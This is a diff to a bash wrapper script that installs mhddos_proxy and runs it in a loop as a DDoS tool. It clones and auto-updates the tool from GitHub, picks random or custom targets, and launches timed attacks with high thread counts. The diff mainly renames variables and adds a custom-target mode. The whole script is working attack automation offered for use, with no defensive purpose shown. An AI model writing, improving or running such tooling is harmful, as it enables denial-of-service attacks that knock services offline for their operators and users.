@@ -12,8 +12,8 @@ my_path=$(readlink -f "$0")
 
 auto_repo='https://github.com/alexnest-ua/auto_mhddos_alexnest.git'
 auto_dir=$my_dir/auto
-mhddos_repo='https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git'
-mhddos_dir=$my_dir/mhddos
+tool_repo='https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git'
+tool_dir=$my_dir/tool
 
 my_ulimit=1048576
 attack_timeout=20m
@@ -50,7 +50,7 @@ With intervals, timeouts, random targets, target autoupdate and ability to run c
 			Run attack on random targets with custom OPTIONS passed to mhddos_proxy:
 				'"$my_name"' run --threads 2000 --rpc 1000 --debug
 		You can also run your custom targets, for instance:
-			'"$my_name"' run mhddos https://YOURTARGETS... OPTIONS...
+			'"$my_name"' run custom https://YOURTARGETS... OPTIONS...
 	sta | start OPTIONS...
 		The same as r | run, but starts the attack in screen session as a service/daemon
 		The name of screen session will be: PID.'"$my_name"'.DATE_TIME_COMMAND
@@ -58,7 +58,7 @@ With intervals, timeouts, random targets, target autoupdate and ability to run c
 			'"$my_name"' start --threads 2000 --rpc 1000 --debug
 		Custom targets, for instance from dedicated channels
 		CUSTOMTARGETSANDOPTIONS would be everything after "python3 runner.py":
-			'"$my_name"' start mhddos CUSTOMTARGETSANDOPTIONS...
+			'"$my_name"' start custom CUSTOMTARGETSANDOPTIONS...
 	s | show ATTACK
 		Show ATTACK progress, basically shows the attack log in real time
 		A part of attack name can be provided
@@ -131,9 +131,9 @@ self_install() {
 		install -m 0700 "$my_path" "$my_exe"
 	fi
 
-	rm -rfv "$mhddos_dir"
-	git clone --depth 1 "$mhddos_repo" "$mhddos_dir"
-	pip3 install -r "$mhddos_dir"/requirements.txt
+	rm -rfv "$tool_dir"
+	git clone --depth 1 "$tool_repo" "$tool_dir"
+	pip3 install -r "$tool_dir"/requirements.txt
 
 	apt autoremove -y
 
@@ -146,26 +146,30 @@ self_run() {
 
 	ulimit -n "$my_ulimit"
 
+	if [ "$1" == custom ]; then
+		shift
+		target_mode=custom
+	fi
+
 	while true; do
 
 		print_blue "Updating the repos..."
-		mhddos_pull=$(git -C "$mhddos_dir" pull origin main)
-		grep -q "Already.*up.*to.*date" <<<"$mhddos_pull" || {
-			print_blue "mhddos repo updated, updating the requirements..."
-			pip3 install -r "$mhddos_dir"/requirements.txt
-			print_green "mhddos requirements updated"
+		tool_pull=$(git -C "$tool_dir" pull origin main)
+		grep -q "Already.*up.*to.*date" <<<"$tool_pull" || {
+			print_blue "Tool repo updated, updating the requirements..."
+			pip3 install -r "$tool_dir"/requirements.txt
+			print_green "Tool requirements updated"
 		}
 		auto_pull=$(git -C "$auto_dir" pull origin main)
 		grep -q "Already.*up.*to.*date" <<<"$auto_pull" || {
 			print_blue "$my_name repo updated, restarting the task with the new version of script..."
-			"$my_path" run "$@"
+			target_mode="$target_mode" "$my_path" run "$@"
 			return
 		}
 
-		if [ "$1" == "mhddos" ]; then
-			shift
-			print_blue "mhddos_proxy with custom targets and options: $@"
-			python3 "$mhddos_dir"/runner.py "$@" &
+		if [ "$target_mode" = custom ]; then
+			print_blue "Custom target: $*"
+			python3 "$tool_dir"/runner.py "$@" &
 			attack_pid=$!
 		else
 			print_blue "Parsing targets from $targets"
@@ -178,9 +182,10 @@ self_run() {
 			target_cmd=$(sed "$target_random"'q;d' <<<"$target_list")
 			print_blue "Random target: $target_random: $target_cmd"
 
-			python3 "$mhddos_dir"/runner.py $target_cmd "$@" &
+			python3 "$tool_dir"/runner.py $target_cmd "$@" &
 			attack_pid=$!
 		fi
+
 		print_green "Running attack for $attack_timeout: PID $attack_pid"
 		sleep "$attack_timeout"
 		print_blue "$attack_timeout of attack elapsed"
